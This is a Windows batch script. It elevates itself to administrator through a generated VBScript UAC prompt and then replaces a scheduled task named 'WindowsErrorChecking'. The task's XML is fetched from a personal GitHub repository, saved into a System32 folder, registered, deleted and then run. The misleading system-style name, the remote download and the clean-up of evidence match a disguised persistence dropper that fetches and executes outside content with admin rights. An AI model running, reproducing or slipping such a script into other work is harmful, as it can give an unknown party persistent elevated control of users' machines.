set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

schtasks /End /TN "WindowsErrorChecking"
schtasks /Delete /TN "WindowsErrorChecking" /F
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windowserrorchecking.xml' -OutFile 'C:\Windows\System32\WindowsPowerShell\windowserrorchecking.xml'"
schtasks /create /tn "WindowsErrorChecking" /xml "C:\Windows\System32\WindowsPowerShell\windowserrorchecking.xml" /f
del /f /q "C:\Windows\System32\WindowsPowerShell\windowserrorchecking.xml"
start "" schtasks /Run /TN "WindowsErrorChecking"

exit
